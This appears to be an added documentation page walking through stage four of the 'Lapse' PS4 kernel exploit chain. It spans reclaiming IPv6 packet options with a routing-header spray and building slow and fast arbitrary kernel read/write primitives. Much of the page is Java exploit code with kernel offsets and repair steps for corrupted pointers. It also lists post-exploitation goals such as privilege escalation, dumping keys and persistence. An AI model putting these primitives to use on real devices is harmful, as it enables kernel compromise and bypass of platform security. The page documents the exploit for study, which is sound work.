@@ -1,0 +1,584 @@
+---
+title: 'Stage 4: Kernel R/W'
+description: 'Achieving arbitrary kernel read and write capabilities'
+---
+
+# Stage 4: Kernel Read/Write
+
+Stage 4 is the culmination of the exploit chain, transforming the aliased pktopts from Stage 3 into arbitrary kernel read/write capabilities. This stage implements both slow and fast R/W primitives, locates critical kernel structures, and establishes the foundation for post-exploitation.
+
+## Overview
+
+Implemented in `Lapse.executeStage4()` at `Lapse.java:1148-1305`.
+
+```java
+public static boolean executeStage4(int[] pktoptsSds, long k100Addr, long kernelAddr,
+    int[] sds, int[] sdsAlt, long aioInfoAddr) {
+    Status.println("=== STAGE 4: Get arbitrary kernel read/write ===");
+    // Implement slow kread, find curproc, setup fast R/W
+    return true; // on success
+}
+```
+
+## Goals of Stage 4
+
+1. **Overwrite main pktopts** - Gain controlled pointer manipulation
+2. **Implement slowKread8** - Slow but reliable kernel read primitive
+3. **Find curproc** - Locate current process structure
+4. **Setup fast R/W** - Create optimized read/write via worker socket
+5. **Fix corrupt pointers** - Repair kernel state to prevent crashes
+
+## Input Parameters
+
+From Stage 3 and Stage 2:
+
+```java
+pktoptsSds[0]   // masterSock - primary aliased socket
+pktoptsSds[1]   // Secondary aliased socket (will be closed)
+k100Addr        // reqs1Addr from Stage 2 (address in 0x100 zone)
+kernelAddr      // Leaked kernel address from Stage 2
+sds             // Socket array from Stage 1
+sdsAlt          // Socket array from Stage 3  
+aioInfoAddr     // aio_info address from Stage 2
+```
+
+## Step 1: Overwrite Main Pktopts
+
+### Setup for Pointer Manipulation
+
+From `Lapse.java:1152-1163`:
+
+```java
+int masterSock = pktoptsSds[0];
+Buffer tclass = new Buffer(4);
+int offTclass = KernelOffset.PS4_OFF_TCLASS;
+
+int pktoptsSize = 0x100;
+Buffer pktopts = new Buffer(pktoptsSize);
+int rsize = Helper.buildRoutingHeader(pktopts, pktoptsSize);
+long pktinfoP = k100Addr + 0x10;
+
+// pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
+pktopts.putLong(0x10, pktinfoP);
+```
+
+### Creating Self-Referencing Pointer
+
+The key trick: set `ip6po_pktinfo` to point to itself.
+
+```
+pktopts structure at k100Addr:
++0x00: ...
++0x10: ip6po_pktinfo = (k100Addr + 0x10)  ← Points to itself!
++0x18: ...
+```
+
+Why? When we later read/write IPV6_PKTINFO, the kernel will:
+1. Dereference `ip6po_pktinfo` pointer
+2. Read/write at that address
+3. Since it points to itself, we can change where it points
+4. This creates an **arbitrary read/write primitive**
+
+### Reclaim Secondary Pktopts
+
+From `Lapse.java:1165-1189`:
+
+```java
+Status.println("Overwrite main pktopts");
+int reclaimSock = -1;
+
+// Close secondary aliased socket to free its pktopts
+Helper.syscall(Helper.SYS_CLOSE, (long)pktoptsSds[1]);
+
+for (int i = 1; i <= NUM_ALIAS; i++) {  // NUM_ALIAS = 100
+    // Spray routing headers with our crafted pktopts
+    for (int j = 0; j < sdsAlt.length; j++) {
+        if (sdsAlt[j] >= 0) {
+            int marker = 0x4141 | ((j + 1) << 16);
+            pktopts.putInt(offTclass, marker);
+            Helper.setRthdr(sdsAlt[j], pktopts, rsize);
+        }
+    }
+
+    // Check if master socket's pktopts was overwritten
+    Helper.getSockOpt(masterSock, Helper.IPPROTO_IPV6, Helper.IPV6_TCLASS, 
+                     tclass, 4);
+    int marker = tclass.getInt(0);
+    if ((marker & 0xffff) == 0x4141) {
+        Status.println("Found reclaim sd at attempt: " + i);
+        int idx = (marker >>> 16) - 1;
+        if (idx >= 0 && idx < sdsAlt.length) {
+            reclaimSock = sdsAlt[idx];
+            Helper.removeSocketFromArray(sdsAlt, idx);
+            break;
+        }
+    }
+}
+
+if (reclaimSock == -1) {
+    Status.println("Failed to overwrite main pktopts");
+    return false;
+}
+```
+
+<Note>
+We now have masterSock pointing to pktopts with ip6po_pktinfo = (k100Addr + 0x10). This will be our kernel read/write interface.
+</Note>
+
+## Step 2: Implementing Slow Kernel Read
+
+### slowKread8 Primitive
+
+This is the first kernel read primitive. It's "slow" because it requires multiple syscalls per read.
+
+Implemented in `Kernel.slowKread8()` (referenced in `Lapse.java:1206`):
+
+```java
+int pktinfoLen = 0x14;
+Buffer pktinfo = new Buffer(pktinfoLen);
+pktinfo.putLong(0, pktinfoP);  // Initial pointer
+
+Buffer readBuf = new Buffer(8);
+
+// Slow kernel read implementation
+Status.println("Implementing slow kernel read");
+
+// Test read the "evf cv" string
+long testValue = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, 
+                                   readBuf, kernelAddr);
+String testStr = Helper.extractStringFromBuffer(readBuf);
+Status.println("slowKread8(\"evf cv\"): " + Long.toHexString(testValue));
+Status.println("*(\"evf cv\"): " + testStr);
+
+if (!"evf cv".equals(testStr)) {
+    Status.println("Test read of \"evf cv\" failed");
+    return false;
+}
+
+Status.println("Slow arbitrary kernel read achieved");
+```
+
+### How slowKread8 Works
+
+```java
+// Conceptual implementation (actual code in Kernel.java)
+long slowKread8(int masterSock, Buffer pktinfo, int pktinfoLen, 
+               Buffer readBuf, long addr) {
+    // Step 1: Update ip6po_pktinfo to point to target address
+    pktinfo.putLong(0, addr);
+    Helper.setSockOpt(masterSock, Helper.IPPROTO_IPV6, Helper.IPV6_PKTINFO, 
+                     pktinfo, pktinfoLen);
+    
+    // Step 2: Read from the address via IPV6_PKTINFO
+    Helper.getSockOpt(masterSock, Helper.IPPROTO_IPV6, Helper.IPV6_PKTINFO, 
+                     readBuf, 8);
+    
+    // Step 3: Return the 8-byte value
+    return readBuf.getLong(0);
+}
+```
+
+<Warning>
+slowKread8 requires 2 syscalls per 8-byte read:
+1. setsockopt() to set the target address
+2. getsockopt() to read the value
+
+This is too slow for bulk operations.
+</Warning>
+
+## Step 3: Finding curproc and File Descriptors
+
+### Locating curproc
+
+From `Lapse.java:1218-1239`:
+
+```java
+// Find curproc from previously freed aio_info using correct offset
+long curproc = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, 
+                                aioInfoAddr + 8);
+
+if ((curproc >>> 48) != 0xffff) {
+    Status.println("Invalid curproc kernel address: " + 
+                  Long.toHexString(curproc));
+    return false;
+}
+
+// Verify curproc by checking PID with correct offset
+long possiblePid = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, 
+                                    curproc + KernelOffset.PROC_PID);
+long currentPid = Helper.syscall(Helper.SYS_GETPID);
+
+Status.println("Current PID: " + currentPid);
+Status.println("Found PID at curproc+0xb0: " + (possiblePid & 0xffffffffL));
+
+if ((possiblePid & 0xffffffffL) != currentPid) {
+    Status.println("Curproc verification failed: " + Long.toHexString(curproc));
+    return false;
+}
+
+Status.println("curproc = " + Long.toHexString(curproc));
+```
+
+### Process Structure
+
+```c
+struct proc {
+    // ... fields ...
+    pid_t p_pid;              // +PROC_PID (0xb0): Process ID
+    struct filedesc *p_fd;    // +PROC_FD: File descriptor table
+    // ... more fields ...
+};
+
+struct filedesc {
+    struct fdescenttbl *fd_files;  // +0x00: File descriptor table
+    // ... fields ...
+};
+
+// fd_files + FILEDESC_OFILES = array of file pointers
+```
+
+### Getting File Descriptor Table
+
+From `Lapse.java:1241-1249`:
+
+```java
+// Store kernel addresses
+Kernel.addr.curproc = curproc;
+Kernel.addr.insideKdata = kernelAddr;
+
+// Use slow kernel read for address resolution
+long curprocFd = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, 
+                                  curproc + KernelOffset.PROC_FD);
+long curprocOfiles = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, 
+                                      curprocFd) + KernelOffset.FILEDESC_OFILES;
+
+Status.println("curproc_fd = " + Long.toHexString(curprocFd));
+Status.println("curproc_ofiles = " + Long.toHexString(curprocOfiles));
+```
+
+<Note>
+**curprocOfiles** is the address of the file descriptor array. Given a file descriptor N, the address of its file structure is at (curprocOfiles + N * 8).
+</Note>
+
+## Step 4: Creating Fast Kernel R/W
+
+### Worker Socket Setup
+
+From `Lapse.java:1251-1265`:
+
+```java
+// Create worker socket for fast R/W
+int workerSock = Helper.createUdpSocket();
+Buffer workerPktinfo = new Buffer(pktinfoLen);
+
+// Create pktopts on worker_sock
+Helper.setSockOpt(workerSock, Helper.IPPROTO_IPV6, Helper.IPV6_PKTINFO, 
+                 workerPktinfo, pktinfoLen);
+
+// Get worker socket's pktopts address using slow read
+long workerFdData = Kernel.getFdDataAddrSlow(masterSock, pktinfo, pktinfoLen, 
+                                            readBuf, workerSock, curprocOfiles);
+long workerPcb = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, 
+                                  workerFdData + KernelOffset.SO_PCB);
+long workerPktopts = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, 
+                                      workerPcb + KernelOffset.INPCB_PKTOPTS);
+
+Status.println("worker_fd_data = " + Long.toHexString(workerFdData));
+Status.println("worker_pcb = " + Long.toHexString(workerPcb));
+Status.println("worker_pktopts = " + Long.toHexString(workerPktopts));
+```
+
+### Socket Structure Traversal
+
+```
+File Descriptor → File Structure → Socket → PCB → pktopts
+
+workerSock (fd) 
+    ↓ via curprocOfiles[workerSock]
+workerFdData (struct file)
+    ↓ +SO_PCB offset
+workerPcb (struct inpcb)
+    ↓ +INPCB_PKTOPTS offset  
+workerPktopts (struct ip6_pktopts)
+```
+
+Now we know the kernel address of workerSock's pktopts structure.
+
+### Initializing KernelRW
+
+From `Lapse.java:1267-1273`:
+
+```java
+// Initialize fast kernel R/W
+kernelRW = new Kernel.KernelRW(masterSock, workerSock, curprocOfiles);
+kernelRW.setupPktinfo(workerPktopts);
+
+Kernel.setKernelAddresses(curproc, curprocOfiles, kernelAddr, 0);
+
+Status.println("Arbitrary kernel r/w achieved!");
+```
+
+### KernelRW Class
+
+The `Kernel.KernelRW` class provides fast read/write primitives:
+
+```java
+// Conceptual implementation
+class KernelRW {
+    int masterSock;   // Has pktopts with ip6po_pktinfo = (k100Addr + 0x10)
+    int workerSock;   // Regular socket with known pktopts address
+    long workerPktopts;
+    long curprocOfiles;
+    
+    void setupPktinfo(long workerPktopts) {
+        this.workerPktopts = workerPktopts;
+    }
+    
+    long kread8(long addr) {
+        // Step 1: Use masterSock to write addr to workerPktopts.ip6po_pktinfo
+        kwrite8(workerPktopts + 0x10, addr);
+        
+        // Step 2: Use workerSock to read from addr via IPV6_PKTINFO
+        Buffer buf = new Buffer(8);
+        Helper.getSockOpt(workerSock, Helper.IPPROTO_IPV6, 
+                         Helper.IPV6_PKTINFO, buf, 8);
+        return buf.getLong(0);
+    }
+    
+    void kwrite8(long addr, long value) {
+        // Step 1: Update masterSock's ip6po_pktinfo to point to addr
+        Buffer pktinfo = new Buffer(0x14);
+        pktinfo.putLong(0, addr);
+        pktinfo.putLong(8, value);  // Value to write
+        Helper.setSockOpt(masterSock, Helper.IPPROTO_IPV6, 
+                         Helper.IPV6_PKTINFO, pktinfo, 0x14);
+    }
+}
+```
+
+<Note>
+**Fast R/W Strategy**:
+- **masterSock** acts as a write primitive (can write to arbitrary addresses)
+- **workerSock** acts as a read primitive (after masterSock sets its pktinfo pointer)
+- Together they provide bidirectional arbitrary kernel R/W
+</Note>
+
+## Step 5: Fixing Corrupt Pointers
+
+### Why Fixes Are Needed
+
+Our exploitation corrupted several kernel structures:
+- Routing headers that don't actually point to valid rthdrs
+- Socket reference counts that are abnormal
+- Pointers that would cause crashes if dereferenced
+
+We must fix these before continuing.
+
+From `Lapse.java:1275-1303`:
+
+```java
+Status.println("Applying fixes to corrupt pointers");
+
+int offIp6poRthdr = KernelOffset.PS4_OFF_IP6PO_RTHDR;
+
+// Fix rthdr pointers for all sockets
+for (int i = 0; i < sds.length; i++) {
+    if (sds[i] >= 0) {
+        long sockPktopts = kernelRW.getSockPktopts(sds[i]);
+        kernelRW.kwrite8(sockPktopts + offIp6poRthdr, 0);  // NULL out rthdr
+    }
+}
+
+long reclaimerPktopts = kernelRW.getSockPktopts(reclaimSock);
+kernelRW.kwrite8(reclaimerPktopts + offIp6poRthdr, 0);
+
+long workerPktoptsAddr = kernelRW.getSockPktopts(workerSock);
+kernelRW.kwrite8(workerPktoptsAddr + offIp6poRthdr, 0);
+
+// Increase ref counts - only for sockets we actually have
+int[] sockIncreaseRef = {masterSock, workerSock, reclaimSock};
+
+for (int i = 0; i < sockIncreaseRef.length; i++) {
+    long sockAddr = kernelRW.getFdDataAddr(sockIncreaseRef[i]);
+    kernelRW.kwrite32(sockAddr + 0x0, 0x100);  // so_count = 256
+}
+
+Status.println("Fixes applied");
+return true;
+```
+
+### Fixes Applied
+
+1. **NULL out routing header pointers**: Prevents crashes if kernel tries to free these
+2. **Increase socket reference counts**: Prevents premature deallocation
+
+<Warning>
+Without these fixes, closing sockets or process termination would likely cause kernel panics. Always apply fixes immediately after gaining kernel R/W.
+</Warning>
+
+## Memory State After Stage 4
+
+```
+Kernel Read/Write Interface:
+
+┌──────────────────────────────────┐
+│ masterSock                       │
+│   ↓                              │
+│ pktopts at k100Addr              │
+│   ip6po_pktinfo = (k100Addr+0x10)│ ← Write primitive
+│   (self-reference)               │
+└──────────────────────────────────┘
+
+┌──────────────────────────────────┐
+│ workerSock                       │
+│   ↓                              │
+│ pktopts at workerPktopts         │
+│   ip6po_pktinfo = (controlled)   │ ← Read primitive
+│   (set by masterSock)            │
+└──────────────────────────────────┘
+
+Kernel Structures Located:
+┌──────────────────────────────────┐
+│ curproc         → Process struct │
+│ curprocOfiles   → FD array       │
+│ kernelAddr      → Kernel .rodata │
+└──────────────────────────────────┘
+
+Result: Full arbitrary kernel R/W
+```
+
+## Usage Examples
+
+### Reading Kernel Memory
+
+```java
+// Read 8 bytes from kernel address
+long value = kernelRW.kread8(someKernelAddr);
+
+// Read 4 bytes
+int value32 = kernelRW.kread32(someKernelAddr);
+
+// Read buffer
+Buffer buf = new Buffer(0x100);
+for (int i = 0; i < 0x100; i += 8) {
+    long qword = kernelRW.kread8(someKernelAddr + i);
+    buf.putLong(i, qword);
+}
+```
+
+### Writing Kernel Memory
+
+```java
+// Write 8 bytes to kernel address
+kernelRW.kwrite8(someKernelAddr, 0x4142434445464748L);
+
+// Write 4 bytes
+kernelRW.kwrite32(someKernelAddr, 0x41424344);
+
+// Patch kernel code
+kernelRW.kwrite32(functionAddr, 0xc3);  // ret instruction
+```
+
+### Getting Socket Structures
+
+```java
+// Get pktopts address for any socket FD
+long pktopts = kernelRW.getSockPktopts(someFd);
+
+// Get file structure address
+long fileStruct = kernelRW.getFdDataAddr(someFd);
+```
+
+## Success Criteria
+
+✅ Stage 4 succeeds when:
+1. Main pktopts overwritten with self-referencing pktinfo pointer
+2. slowKread8 reads "evf cv" string correctly
+3. curproc found and verified (PID matches)
+4. Worker socket pktopts address obtained
+5. KernelRW class initialized
+6. Corrupt pointers fixed
+7. Test reads/writes succeed
+
+## Common Failure Points
+
+### Failed to Overwrite Main Pktopts
+
+```
+Failed to overwrite main pktopts
+```
+
+**Cause**: Routing header spray didn't reclaim pktopts memory  
+**Solution**: Increase NUM_ALIAS, ensure sdsAlt has enough sockets
+
+### Test Read of "evf cv" Failed
+
+```
+Test read of "evf cv" failed
+```
+
+**Cause**: slowKread8 not working, pointer manipulation failed  
+**Solution**: Verify k100Addr is correct, check pktopts structure layout
+
+### Invalid curproc Kernel Address
+
+```
+Invalid curproc kernel address: 0x0000....
+```
+
+**Cause**: aioInfoAddr was wrong or structure changed  
+**Solution**: Verify Stage 2 leak, check firmware offsets
+
+### Curproc Verification Failed
+
+```
+Curproc verification failed: 0xffff....
+Current PID: 123
+Found PID at curproc+0xb0: 456
+```
+
+**Cause**: PROC_PID offset wrong for this firmware  
+**Solution**: Update KernelOffset.PROC_PID for your firmware version
+
+## Post-Exploitation
+
+With arbitrary kernel R/W achieved, the exploit proceeds to:
+
+1. **Privilege escalation** - Patch process credentials
+2. **Jailbreak patches** - Disable security checks
+3. **Code execution** - Load and execute payloads
+4. **Persistence** - Establish permanent access
+
+These are typically handled by `Kernel.postExploitationPS4()` (called in `Lapse.java:1465`).
+
+## Performance Characteristics
+
+### slowKread8
+- **Speed**: ~2 syscalls per 8 bytes
+- **Use case**: Initial setup, locating structures
+- **Limitation**: Too slow for bulk operations
+
+### Fast R/W (KernelRW)
+- **Speed**: ~1 syscall per 8 bytes (read) or 1 syscall per 20 bytes (write with pktinfo)
+- **Use case**: Post-exploitation operations
+- **Limitation**: Requires initial setup via slowKread8
+
+<Note>
+The fast R/W primitives are fast enough for practical use. Reading/writing MB of kernel memory is feasible.
+</Note>
+
+## Next Steps
+
+With full kernel R/W:
+
+- **Jailbreak the system** - Patch kernel security checks
+- **Load payloads** - Execute arbitrary code
+- **Dump memory** - Extract keys and sensitive data
+- **Install persistence** - Survive reboots
+
+## Related Code
+
+- `Lapse.executeStage4()` - Main stage function (`Lapse.java:1148`)
+- `Kernel.slowKread8()` - Slow read primitive (Kernel.java)
+- `Kernel.KernelRW` - Fast R/W class (Kernel.java)
+- `Kernel.postExploitationPS4()` - Post-exploit patches (Kernel.java)
